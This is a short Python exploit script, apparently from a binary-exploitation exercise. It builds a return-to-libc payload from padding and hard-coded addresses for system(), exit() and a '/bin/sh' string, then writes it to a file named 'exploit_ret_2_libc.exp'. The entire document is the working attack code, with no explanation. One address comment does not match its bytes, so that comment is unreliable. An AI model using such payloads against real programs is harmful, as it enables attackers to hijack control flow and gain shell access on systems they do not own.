bin_sh_addr = b"\x45\xc1\x0b\x08" # 0x80bc140, 0x80bba28
system_addr = b"\x30\xef\x04\x08" #  libc_system() 0x804ef30
exit_addr = b"\x30\xe4\x04\x08" # exit() 0x804e430
fill = b"0"*7*4


payload = fill + system_addr + exit_addr + bin_sh_addr
print (payload)
f = open("exploit_ret_2_libc.exp", "wb")
f.write(payload)
f.close()